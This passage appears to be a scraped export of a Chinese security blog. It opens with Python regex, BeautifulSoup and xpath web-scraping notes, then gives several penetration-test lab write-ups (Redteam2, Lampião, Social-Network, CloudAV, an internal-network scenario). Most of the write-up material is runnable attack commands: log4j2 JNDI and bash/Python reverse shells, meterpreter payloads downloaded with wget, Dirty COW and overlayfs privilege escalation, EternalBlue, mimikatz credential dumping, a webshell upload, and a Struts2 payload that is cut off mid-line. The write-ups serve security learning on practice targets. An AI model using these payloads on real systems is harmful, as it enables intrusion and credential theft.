匹配一个换行符 \\t 匹配一个制表符 ^ 匹配字符串开始 $ 匹配字符串结尾 \\W 匹配非字母或者数字或下划线 \\D 匹配非数字 \\S 匹配非空白符 a | b 匹配字符a或者b () 匹配括号内的表达式，也表示一个组 […] 匹配字符组中的字符 [^…] 匹配除了字符组中字符的所有字符 [ ]：代表一个集合，有如下三种情况 [abc]：能匹配其中的单个字符 [a-z0-9]：能匹配指定范围的字符，可取反（在最前面加入^） [2-9] [1-3]：能够做组合匹配 量词：控制元字符出现的次数 * 重复0次或者多次 + 重复一次或者多次 ? 重复一次或者更多次 {n} 重复n次 {n,} 重复n次或多次 {n,m} 重复n到m次 贪婪模式与非贪婪模式 .* 贪婪模式 .*? 非贪婪模式 re模块：常用函数 函数 描述 返回结果 compile(pattern[,flags]) 将正则表达式转化为一个正则表达式对象，flags用于指定正则匹配模式，如re.S） pattern对象 findall(pattern,str[,flags]) 匹配所有符合条件的文本 列表形式 finditer(pattern,str[,flags]) 匹配所有符合条件的文本 迭代对象（Match对象） match(pattern,str[,flags]) 从头开始匹配 一个Match类对象 search(pattern,str[,flags]) 从任意位置开始匹配 一个Match类对象 sub(pattern,repl,string[,count,flags]) 正则匹配替换，count表示替换次数（默认全部替换，并不改变原字符串） 原字符串的拷贝并替换 subn(pattrn,repl,string[count,flags]) 正则匹配替换，并返回替换结果 split(pattern,str[,maxsplit,flags]) 按给定匹配符号拆分字符串 从迭代器、match对象中取出对象: 123iter = finditer()for i in iter: print(i.group()) 正则匹配模式正则表达式匹配时通过正则匹配模式进行匹配控制 使用方法： re.findall(r&quot;表达式&quot;,re.S) 模式 描述 I 忽略大小写 L 字符集本地化表示 M 多行匹配模式 S 使元字符’.’可以匹配换行符在内的任意字符 X 忽略正则表达式中的空白和注释 U 匹配unicode字符 正则分组函数 函数 描述 group() 一个参数，返回单个字符串；多个参数，返回一个元组，元组里每一项对应一个参数。没有参数，参数默认为0（返回所有匹配内容） groups() 返回一个包含所有匹配内容的元组 groupdict() 返回一个字典，包含所有经命名的匹配分组，键值是分组名 分组正则表达式使用方法： result = re.findall(r&quot;&lt;div class=&#39;(?P&lt;id&gt;.*?)&#39;&gt;&quot;) 将class字段的内容命名为id 获取： result.group(id) 表达式 模式 描述 (?P&lt;name&gt;...) 分组命名模式 可通过索引编号或name名称获取内容 (?P=name) 分组引用模式 可以在正则表达式中引用前面命名过的正则表达式 (?:...) 分组不捕获模式 计算索引时跳过该分组 (...) 默认分组捕获模式 可单独取出分组内容 bs4解析 相关函数： find函数： 标签定位： soup.find(‘div’):寻找出现的第一个div标签 属性定位： soup.find(‘div’,class_&#x3D;’tang’):寻找class属性值为tang的标签 soup.find_all(‘div’):找到符合要求的所有标签 select函数: soup.select(‘某种选择器(id，class，标签……)’):返回一个列表 层级选择器： soup.select(‘ .tang &gt; ul &gt; li &gt; a ‘):每个&gt;表示一个层级 soup.select(‘ .tang &gt; ul a ‘):空格表示多个层级 获取标签之间的文本数据： -soup.a.text&#x2F;string&#x2F;get_text() -text&#x2F;get_text():获取一个标签中所有文本内容 -string：只可以获取该标签下的直系文本内容 获取标签中的属性值 soup.a[‘href’]:获取a标签下的href属性值 123456789101112131415161718&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;/&gt;&lt;title&gt;测试bs4&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;&lt;p&gt;百里守约&lt;/p&gt;&lt;/div&gt;&lt;div class=&quot;song&quot;&gt;&lt;p&gt;李清照&lt;/p&gt;&lt;p&gt;王安石&lt;/p&gt;&lt;p&gt;苏轼&lt;/p&gt;&lt;p&gt;柳宗元&lt;/p&gt;&lt;a href=&quot;http: //www.song.com/&quot; title=&quot;赵匡胤&quot; target=&quot;_self&quot;&gt;&lt;span&gt;this is span&lt;/span&gt;宋朝是最强大的王朝，不是军队的强大，而是经济很强大，国民都很有钱&lt;/a&gt;&lt;a href=&quot; &quot; class=&quot;du&quot;&gt;总为浮云能蔽日，长安不见使人愁&lt;/a&gt;&lt;img src=&quot;http:// www.baidu.com/meinv.jpg&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;&lt;div class=&quot;tang&quot;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot; http://w.baidu.com&quot; title= &quot;ging&quot;&gt;清明时节雨纷纷,路上行人欲断魂，借问酒家何处有,牧童遥指杏花村&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot; http://ww.163.com&quot; title=&quot;gin&quot;&gt;秦时明月汉时关,万里长征人未还,但使龙城飞将在，不教胡马度阴山&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href= &quot;http://ww.126.com&quot; alt=&quot;gqi &quot;&gt;岐王宅里寻常见，崔九堂前几度闻，正是江南好风景,落花时节又逢君&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http: //www.sina.com&quot; class=&quot;du&quot;&gt;杜甫&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http: / / www.dudu.com&quot; class=&quot;du&quot;&gt;杜牧&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;杜小月&lt;/b&gt;&lt;/li&gt;&lt;li&gt;&lt;i&gt;度蜜月&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http:.//w.haha.com&quot; id=&quot;feng&quot;&gt;凤凰台上凤凰游，凤去台空江自流，吴宫花草埋幽径,晋代衣冠成古丘&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 流程图： 项目1：爬取三国演义小说标题所有的章节标题和内容请求分析： 请求方式为get 标题数据位于’.book-mulu &gt; ul &gt; li &gt; a’的内容中 网页数据位于’.book-mulu &gt; ul &gt; li &gt; a’的href值中 用如下代码筛选获取标题和url内容 1234for li in res: urls = li.a[&#x27;href&#x27;] detail_urls = &#x27;https://www.shicimingju.com&#x27;+ urls title = li.a.string 对目的url进行分析 其文本内容位于div标签中class&#x3D;’.chapter_content ‘中 对文本进行筛选 1res_page = detail_soup.select(&#x27;div &gt; div &gt; div &gt;div.chapter_content&#x27;) 最终代码 1234567891011121314151617181920212223242526272829import requests,timefrom bs4 import BeautifulSoupurl = &#x27;https://www.shicimingju.com/book/sanguoyanyi.html&#x27;header = &#123; &#x27;User-Agent&#x27; : &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27;&#125;res_content = requests.get(url=url,headers=header).content#将数据实例化为BeautifulSoup对象soup = BeautifulSoup(res_content, &#x27;lxml&#x27;)#进行数据筛选res = soup.select(&#x27;.book-mulu &gt; ul &gt; li&#x27;)fp = open(&#x27;./sanguo.txt&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;)for li in res: urls = li.a[&#x27;href&#x27;] detail_urls = &#x27;https://www.shicimingju.com&#x27;+ urls title = li.a.string #请求对应url,获取内容 res_page_content = requests.get(url=detail_urls,headers=header).content #每次请求延迟一秒防止请求过于频繁导致ip被加入黑名单 time.sleep(1) #实例化一个BeautifulSoup对象 detail_soup = BeautifulSoup(res_page_content, &#x27;lxml&#x27;) res_page = detail_soup.select(&#x27;div &gt; div &gt; div &gt;div.chapter_content&#x27;) #解析章节内容 for data in res_page: fp.write(str(title)+&#x27;:&#x27;+data.text+&#x27;\\n&#x27;) print(str(title)+&#x27; 爬取成功\\n&#x27;)fp.close() 遇到的问题： 1.res_page不能直接加’.text’打印信息，报错：AttributeError: ResultSet object has no attribute ‘text‘ 解决： print(res_page.text)错误，res_page本身是 ResultSet 类型，无.text属性，想要打印信息使用 12for data in res_page: print(data.text) 2.res_page &#x3D; detail_soup.find(‘div’, _class &#x3D; ‘chapter_content’)返回None，但是数据存在。 暂时未解决，更换select函数进行筛选 xpath解析最常用且最便捷高效的一种解析方式，通用性最强，能在多种语言中使用 原理： 1.实例化etree的对象且需要将被解析的页面源码数据加载到该对象中 2.调用etree对象中的xpath方法结合xpath表达式实现标签定位和内容捕获 导入数据包 1from lxml import etree 实例化etree对象（from lxml import etree） 1.将本地的html文档中源码数据加载到etree对象中： 12html = etree.parse(&#x27;./test.html&#x27;, etree.HTMLParser()) # html.xpath(&#x27;xpath表达式&#x27;) 2.将互联网中获取的数据加载到该对象中 12html = etree.HTML(&#x27;page_data&#x27;) # page_data为从页面获取的源码数据html.xpath(&#x27;xpath表达式&#x27;) xpath常用表达式表达式 含义nodename 选取此节点的所有子节点&#x2F; 表示的是从根节点开始定位。表示的是一个层级&#x2F;&#x2F; 从当前节点选取子孙节点（后代）. 选取当前节点@ 选取属性 (&#x2F;@attrName)text() 获取文本,返回一个列表 ​ &#x2F;text()获取标签中直系文本内容 ​ &#x2F;&#x2F;text()获取标签中所有文本内容 * 通配符，任何元素节点 属性定位： tag[@Name&#x3D;‘value’] 选取给定属性具有给定值的指定元素。 如 div[@class&#x3D;‘cell’] 表示 class 属性的值为 cell 的所有 div 元素 索引定位： div[@class&#x3D;‘cell’]&#x2F;a[2] 表示 class 属性的值为 cell 的所有 div 元素下的第二个a元素。 &#x2F;&#x2F;div[@class&#x3D;”song”]&#x2F;img&#x2F;@src 获取img标签中src属性的值 多层级解析用’|’分割，如：li.xpath(‘&#x2F;&#x2F;ul[“@class&#x3D;clearfix”]&#x2F;li&#x2F;&#x2F;img&#x2F;@src | &#x2F;&#x2F;ul[“@class&#x3D;clearfix”]&#x2F;li&#x2F;&#x2F;img&#x2F;@alt ） 项目2：爬取58二手房的房源信息构造xpath表达式： title信息位于class属性为“property-content-title”的div标签的title属性中 编写xpath表达式如下 tree.xpath(&#39;//div[@class=&quot;property-content-title&quot;]//@title&#39;) 完整代码 123456789101112from lxml import etreeimport requestsurl = &#x27;https://liuzhou.58.com/ershoufang/&#x27;header = &#123; &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27;&#125;res = requests.get(url=url,headers=header).texttree = etree.HTML(res)text = tree.xpath(&#x27;//div[@class=&quot;property-content-title&quot;]//@title&#x27;)#持久化存储fp = open(&#x27;58.txt&#x27;,&#x27;w&#x27;,encoding = &#x27;utf-8&#x27;)fp.write(text+&#x27;\\n&#x27;) 项目3：爬取图片网站略缩图http://pic.netbian.com/4kdongman/ 构造xpath表达式 需要解析src值和alt值，这两个元素位于class值为clearfix的ul标签下的li标签中 tree.xpath(&#39;//ul[&quot;@class=clearfix&quot;]/li&#39;) 利用循环取出url和title 123title = li.xpath(&#x27;//ul[&quot;@class=clearfix&quot;]/li//@alt&#x27;)[i]+ &#x27;.jpg&#x27;title = title.encode(&#x27;iso-8859-1&#x27;).decode(&#x27;gbk&#x27;)urls = &#x27;http://pic.netbian.com/4kdongman/&#x27; + li.xpath(&#x27;//ul[&quot;@class=clearfix&quot;]/li//img/@src&#x27;)[i] 运行后title出现乱码 查看浏览器header头发现编码方式为’gbk’ 直接将resquest返回数据编码方式改为gbk报错 解决方法： 通用中文乱码解决方案 title = title.encode(&#39;iso-8859-1&#39;).decode(&#39;gbk&#39;) 最终代码 1234567891011121314151617181920212223242526272829import requestsfrom lxml import etreeimport osurl=&#x27;http://pic.netbian.com/4kdongman/&#x27;header = &#123; &#x27;User-Agent&#x27; : &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27;&#125;res = requests.get(url=url,headers=header).texttree = etree.HTML(res)text = tree.xpath(&#x27;//div[&quot;@class=slist&quot;]/ul/li&#x27;)i = 0for li in text: title = li.xpath(&#x27;//ul[&quot;@class=clearfix&quot;]/li//@alt&#x27;)[i]+ &#x27;.jpg&#x27; title = title.encode(&#x27;iso-8859-1&#x27;).decode(&#x27;gbk&#x27;) img_urls = &#x27;http://pic.netbian.com&#x27; + li.xpath(&#x27;//ul[&quot;@class=clearfix&quot;]/li//img/@src&#x27;)[i] img_data = requests.get(url=img_urls,headers=header).content #创建文件夹 if not os.path.exists(&#x27;./Pic&#x27;): os.mkdir(&#x27;./Pic&#x27;) # 持久化存储 img_path = &#x27;Pic/&#x27;+title with open(img_path,&#x27;wb&#x27;) as fp: fp.write(img_data) print(title + &#x27;下载成功&#x27;) if i &lt; 19: i = i + 1#每页图片共20张 else: break 爬取多页 123456789101112131415161718192021222324252627282930313233343536import requestsfrom lxml import etreeimport osdef download(url): header = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27; &#125; res = requests.get(url=url, headers=header).text tree = etree.HTML(res) text = tree.xpath(&#x27;//div[&quot;@class=slist&quot;]/ul/li&#x27;) i = 0 for li in text: title = li.xpath(&#x27;//ul[&quot;@class=clearfix&quot;]/li//@alt&#x27;)[i] + &#x27;.jpg&#x27; title = title.encode(&#x27;iso-8859-1&#x27;).decode(&#x27;gbk&#x27;) img_urls = &#x27;http://pic.netbian.com&#x27; + li.xpath(&#x27;//ul[&quot;@class=clearfix&quot;]/li//img/@src&#x27;)[i] img_data = requests.get(url=img_urls, headers=header).content # 创建文件夹 if not os.path.exists(&#x27;./Pic&#x27;): os.mkdir(&#x27;./Pic&#x27;) # 持久化存储 img_path = &#x27;Pic/&#x27; + title with open(img_path, &#x27;wb&#x27;) as fp: fp.write(img_data) print(title + &#x27;下载成功&#x27;) if i &lt; 19: i = i + 1#每页图片共20张 else: breakfor page in range(1,3): if page == 1: url = &#x27;http://pic.netbian.com/4kmeinv/&#x27;#第一页和后续页面url格式不一致 else: url=&#x27;http://pic.netbian.com/4kmeinv/index_&#x27;+str(page)+&#x27;.html&#x27; download(url)","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"python开发","slug":"python开发","permalink":"http://example.com/tags/python%E5%BC%80%E5%8F%91/"}]},{"title":"Redteam2靶场","slug":"Redteam2","date":"2022-10-12T14:34:50.744Z","updated":"2022-11-22T07:59:49.834Z","comments":true,"path":"2022/10/12/Redteam2/","link":"","permalink":"http://example.com/2022/10/12/Redteam2/","excerpt":"","text":"Redteam2 端口扫描对主机进行全端口扫描，发现开启了 22 和 38080端口 1nmap 192.168.31.132 -A -p 1-65535` 访问 38080端口，是springboot的http服务 目录扫描未发现未授权 外网服务器权限利用log4j2反弹shell攻击机本地搭建jndi服务 1java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.31.31 攻击机设置监听7777端口 1nc -lvvp 7777 反弹shell 1/bin/bash -i &gt;&amp; /dev/tcp/192.168.31.31/7777 0&gt;&amp;1 将base64编码后的反弹shell语句放入下列payload中 1payload=$&#123;jndi:ldap://192.168.31.31:1389/TomcatBypass/Command/Base64/L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMzEvNzc3NyAwPiYx&#125; 向192.168.132:38080&#x2F;hello发送POST请求，参数为payload，成功获取shell 在root路径下获取第一个flag 同时还有一串疑似密码的字符串 判断是否处于docker环境中 1cat /proc/1/cgroup 发现我们处于docker环境中 SSH登录这时候想到该主机还开放了22端口，刚刚flag.txt中还有一串类似一账号密码的字符串，尝试着登录下 1ssh saul@192.168.31.132 成功登录该主机 域内个人主机权限信息收集发现两张网卡 192.168.31.132 10.0.1.6 使用工具:scaninfo 1./scaninfo_linux_x64 -i 10.0.1.0/24 发现10.0.1.7存在ms17-010漏洞 使用Frp进行代理攻击机开启http服务 1python3 -m http.server 1111 靶机访问该服务下载Frp 1wget 192.168.31.31:1111/frp_0.44.0_linux_amd64.tar.gz 解压 1tar -xvf frp_0.44.0_linux_amd64.tar.gz 删除原本的配置文件，上传frpc.ini 内容如下 1234567891011121314[common]tls_enable = trueserver_addr = 192.168.1.105 server_port = 8000 token = 1q2w3e pool_count = 5 protocol = tcp health_check_type = tcp health_check_interval_s = 100 [proxies]remote_port = 6000 plugin = socks5 use_encryption = true use_compression = true 配置本地frps.ini 内容如下 12345678910[common]bind_addr = 0.0.0.0 bind_port = 8000 dashboard_addr = 0.0.0.0 dashboard_port = 7600 dashboard_user = root dashboard_pwd = 123456 token = 1q2w3e heartbeat_timeout = 90 max_pool_count = 5 攻击机执行./frps -c frps.ini 靶机执行./frpc -c frpc.ini MS17-010利用MSF设置Socks5代理 12setg Proxies socks5:127.0.0.1:6000set ReverseAllowProxy true//允许反向代理 设置MS17-010利用模块 123use exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp//由于目标处于内网，无法反向连接set rhost 10.0.1.7 成功反弹 主机为win7，在桌面上找到flag 域控权限添加路由： run autoroute -s 10.0.0.7/24 信息收集利用mimikatz抓取凭据12load mimikatzcreds_all 获取密码Red12345 ipconfig发现新网卡10.0.0.7 上传fscan进行扫描修改编码chcp 65001 upload fscan64.exe fscan64.exe fscan64.exe -h 10.0.0.0/24 发现DC主机10.0.0.12同样存在MS17-010漏洞 MS17-010利用（失败）MSF添加路由 123use post/multi/manage/autorouteset session 1run 未运行成功 CVE-2021-42287&#x2F;CVE-2021-42278设置socks代理 12use auxiliary/server/socks_proxyrun 更改本地代理配置与msf中设置对应 vim /etc/proxychains4.conf 漏洞利用脚本(前提：一个域用户的账密) https://github.com/WazeHell/sam-the-admin 1proxychains4 python3 sam_the_admin.py &quot;redteam/root:Red12345&quot; -dc-ip 10.0.0.12 -shell 成功获得shell 由于该脚本采用的SMB协议，不能使用cd命令 type C:\\\\Users\\Administrator\\Desktop\\flag.txt&#x2F;&#x2F;读取flag 成功！！！！！！","categories":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/categories/%E9%9D%B6%E5%9C%BAwp/"}],"tags":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BAwp/"},{"name":"权限提升","slug":"权限提升","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"域渗透","slug":"域渗透","permalink":"http://example.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"},{"name":"log4j2","slug":"log4j2","permalink":"http://example.com/tags/log4j2/"}]},{"title":"vulhub靶场 Lampião","slug":"vulhub靶场-Lampião  wp","date":"2022-10-10T09:01:25.568Z","updated":"2022-10-18T13:26:47.839Z","comments":true,"path":"2022/10/10/vulhub靶场-Lampião  wp/","link":"","permalink":"http://example.com/2022/10/10/vulhub%E9%9D%B6%E5%9C%BA-Lampi%C3%A3o%20%20wp/","excerpt":"","text":"攻击机：192.168.189.129 靶机：192.168.189.137 主机探测：nmap 192.168.189.0/24 发现靶机192.168.189.137 外网打点访问80端口： 目录扫描 目录扫描工具报错，无法进行扫描 进行全端口扫描 nmap 192.168.189.137 -p 1-65535 发现端口1898 访问对应端口，发现为Drupal框架 目录扫描发现有CHANGELOG.txt文件 访问得到Drupal版本为7.54 百度一下历史漏洞 发现存在CVE-2018-7600远程代码执行漏洞 MSF查找对应漏洞（都是2018年的,应该就是这个,试试先） 1234use exploit/unix/webapp/drupal_drupalgeddon2set rhosts 192.168.189.137set rport 1898run 成功接收到反弹会话 权限提升查看权限为www-data 上传漏洞探针 1234upload linux-exploit-suggester.sh /tmp/a.shshellchmod +x a.sh./a.sh 发现了一堆可能的漏洞，这里使用脏牛漏洞进行提权 将40847.cpp复制到桌面 1cp /usr/share/exploitdb/exploits/linux/local/40847.cpp . 上传至靶机并编译执行 123upload 40847.cpp /tmp/40847.cppg++ -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil./40847 su密码被更改为dirtyCowFun 执行su命令报错 需要利用python做一个伪终端，否则不能使用su命令 1python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; 成功提权","categories":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/categories/%E9%9D%B6%E5%9C%BAwp/"}],"tags":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BAwp/"},{"name":"权限提升","slug":"权限提升","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"}]},{"title":"Vulnhub靶场 Social-Network","slug":"BoredHackerBlog-social_network","date":"2022-10-09T11:19:10.998Z","updated":"2022-10-09T11:19:31.988Z","comments":true,"path":"2022/10/09/BoredHackerBlog-social_network/","link":"","permalink":"http://example.com/2022/10/09/BoredHackerBlog-social_network/","excerpt":"","text":"环境192.168.44.130 192.168.44.128 攻击机192.168.44.135 靶机 1.主机发现通过nmap扫描网段，发现靶机ip和开放端口，并得知靶机5000端口是基于python开发的web系统nmap 192.168.44.0/24 -A 2.目录扫描访问对应服务，是一个匿名评论平台 上传了几条xss均失败，也没啥可利用的点，就试着扫描下目录访问&#x2F;admin目录，好家伙，直接命令执行了测试了一下，没有回显，直接反弹shell吧 3.反弹shell既然知道该站点是基于python开发的，就找找python反弹shell的payload这里推荐一个反弹shell命令生成的站点：https://forum.ywhack.com/shell.php kali攻击机先开启监听 执行反弹shell命令 1import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.44.130&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]); kali收到反弹的shell 4.内网渗透查看当前路径发现dockerfile文件，但不完全确定是否处于docker环境，百度查了下，找到以下三种确定方法方法1：如果根目录下存在dockerenv，那么有极大的概率，我们是在docker环境中方法2：查看ip，如果ip与网站ip不同，那么有极大的概率，我们是在docker环境中方法3：如果&#x2F;proc&#x2F;1&#x2F;cgroup文件里面可以看到docker，以及docker的hash值。那么我们一定在docker环境中。 使用方法3查看，确认我们处于docker环境中 使用msf重新生成反弹shellmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.44.130 LPORT=8888 -f elf &gt; shell.elf开启http服务python3 -m http.server 8000使用wget命令从主机下载shellwget 192.168.44.130:8000/shell.elf设置监听 1234use exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset lhost 192.168.44.130exploit 加权chmod +x shell.elf执行./shell.elf成功反弹至msf查看本机路由run get_local_subnets添加新路由run autoroute -s 172.17.0.2/24 内网主机探测123use auxiliary/scanner/portscan/tcpset rhosts 172.17.0.2/24exploit 发现两台存活主机172.17.0.1172.17.0.2172.17.0.3 设置Socks5代理12use auxiliary/server/socks_proxyexploit 配置proxychains4代理vim /etc/proxychains4.conf在配置好代理之后，可以使用kali的代理工具proxychains4进行内网扫描因为socks5不支持ICMP协议，不能对它使用ping命令，所以使用-Pn 参数proxychains4 nmap -Pn -sT 172.17.0.2 搭建Socks5隧道（proxifier）1.设置代理服务器2.测试连通性失败了，仔细一看，因为proxy checker测试连通性的默认网址是www.google.com，将测试的默认网址更改为www.baidu.com就可以了3.设置代理规则 nmap扫描存活主机不知道为什么一直都在报timeout 为啥我和别人运行结果差距这么大？？？问题不大，先继续假装扫描到了172.17.0.2开放了9200端口，开放了elasticserach服务 漏洞利用使用msf进行elasticsearch的漏洞利用 1234search elasticsearchuse exploit/multi/elasticsearch/search_groovy_scriptset rhosts 172.17.0.2run 成功收到会话ls命令发现目录下存在passwords文件使用md5在线解密后得到密码表 john 3f8184a7343664553fcb5337a3138814 1337hack test 861f194e9d6118f3d942a72be3e51749 1234test admin 670c3bbc209a18dde5446e5e6c1f1d5b 1111pass root b3d34352fc26117979deabdf1b9b6354 1234pass jane 5c158b60ed97c723b673529b8a3cf72b 1234jane ssh尝试登录，发现只有john账号能登陆 权限提升1.查看主机内核版本为linux 3.13，版本较低，尝试寻找下有没有内核漏洞能够提权 1searchsploit linux 3.13 2.查看exp代码发现代码末尾会调用gcc来编译ofs-lib.c文件，因为靶机上没有gcc环境，所以不能在靶机上直接运行。我们可以把ofs-lib.so文件和exp文件一同上传到靶机，改成只是调用文件，编译代码操作我们在kali本地完成,这时代码里的编译文件的代码也就不需要了，删除方框内编译代码即可。 3.先复制一份payload到桌面cp /usr/share/exploitdb/exploits/linux/local/37292.c . 4.注释掉方框内代码，并在本地编译gcc -o exp 37292.c5.查找ofs-lib.so文件，将其复制到同一目录 12find /usr -name ofs-lib.socp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so . 6.python开启http.server服务,靶机远程wget下载生成的exp和ofs-lib.so 123python3 -m http.server 8000wget 192.168.44.130:8000/expwget 192.168.44.130:8000/ofs-lib.so 7.给exp执行权限，执行exp后即可获得root权限发现执行失败，并需要输入密码查看exp文件之后发现，我们要将exp和ofs-lib.so文件下载到tmp目录才可以成功执行8.将两个文件重新移动至&#x2F;tmp目录并执行，成功获得root权限搞定！","categories":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/categories/%E9%9D%B6%E5%9C%BAwp/"}],"tags":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BAwp/"}]},{"title":"Vulnhub靶场 CloudAV","slug":"BoredHackerBlog-CloudAV","date":"2022-10-09T07:57:41.539Z","updated":"2022-10-09T10:23:46.391Z","comments":true,"path":"2022/10/09/BoredHackerBlog-CloudAV/","link":"","permalink":"http://example.com/2022/10/09/BoredHackerBlog-CloudAV/","excerpt":"","text":"环境192.168.202.128 攻击机 192.168.202.132 靶机 主机发现利用nmap扫描192.168.202.0&#x2F;24网段 扫描到192.168.202.132开放了8080端口 web漏洞发现 要求我们输入验证码，看起来像有注入 用万能密码 1&quot; or 1=1 -- -成功绕过 提示我们进行扫描，此处可能存在命令执行漏洞 输入1;whoami,可以看到成功回显 反弹shell利用bash尝试反弹shell kali开启监听 执行1;echo &#39;bash -i &gt;&amp; /dev/tcp/192.168.202.128/7777 0&gt;&amp;1&#39; |bash 成功反弹 提权发现上级目录下存在update_cloudav为root权限 查看其源代码，我们需要给其一个参数，就能命令执行 执行./update_cloudav &quot; |echo &#39;bash -i &gt;&amp; /dev/tcp/192.168.202.128/7777 0&gt;&amp;1&#39; |bash&quot; linux开启监听8888端口 成功","categories":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/categories/%E9%9D%B6%E5%9C%BAwp/"}],"tags":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BAwp/"}]},{"title":"vulfocus场景 内网死角","slug":"内网死角","date":"2022-10-08T16:00:00.000Z","updated":"2022-10-18T09:52:22.308Z","comments":true,"path":"2022/10/09/内网死角/","link":"","permalink":"http://example.com/2022/10/09/%E5%86%85%E7%BD%91%E6%AD%BB%E8%A7%92/","excerpt":"","text":"内网死角环境 攻击机：ubuntu服务器 外网入口：123.58.224.8:33067 web渗透访问123.58.224.8:33067 发现靶机上运行了laravel服务，版本为v8.41.0 百度一下历史漏洞，发现该版本有一个远程代码执行漏洞 CVE-2021-3129 一键getshell https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP 利用 python3 laravel-CVE-2021-3129-EXP.py http://123.58.224.8:33067 url后面一定不要加 &#x2F; 成功getshell ps：该脚本上传的webshell需要3.0版本以下的哥斯拉才能连接 使用哥斯拉连接 内网上线msf在msf生成linux后门 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=服务器ip LPORT=7777 -f elf -o shell.elf ms开启监听 12345use exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset LHOST 服务器ipset LPORT 7777exploit 利用webshell执行shell.elf 成功接收到会话 内网横向主机1在该台主机发现多张网卡 123410.0.0.39172.18.0.31192.120.2.91192.120.4.66 添加两条路由 12run autoroute -s 192.120.2.0/24run autoroute -s 192.120.4.0/24 资产探测 12345use auxiliary/scanner/portscan/tcpset rhosts 192.120.4.0/24set ports 22,23,80,8080,3389,445,6379set threads 20run 1234192.120.4.46:8080192.120.4.43:80192.120.4.62:8080192.120.4.66:80 搭建socks5代理1use auxiliary/server/socks_proxy 服务器打开对应端口 proxifier设置代理 访问192.120.4.46:8080，发现tomcat服务v8.5.19 利用漏洞上线msf利用vulmap扫描，发现CVE-2017-12615 哥斯拉生成木马并在木马文件夹下执行 curl -v -X PUT --data-binary @shell.jsp &quot;http://192.120.4.46:8080/shell.jsp/&quot; 连接 msf生成shell.elf msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ip LPORT=2333 -f elf -o shell.elf 开启监听 12345use exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset LHOST 服务器ipset LPORT 2333run 主机2该主机有两张网卡 12192.120.1.73172.18.0.19 添加两条路由 12run autoroute -s 192.120.1.0/24run autoroute -s 172.18.0.0/24 扫描该网段 12345use auxiliary/scanner/portscan/tcpset rhosts 192.120.1.0/24set ports 22,23,80,8080,3389,445,6379set threads 20run 在http://192.120.1.49:8080/发现sturts2 服务 利用S2-059漏洞上线msf设置burp socks 代理 抓包前关闭proxifier代理，使用浏览器代理工具代理，不然会抓不到包 数据包 1skillName=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec(&#x27;curl 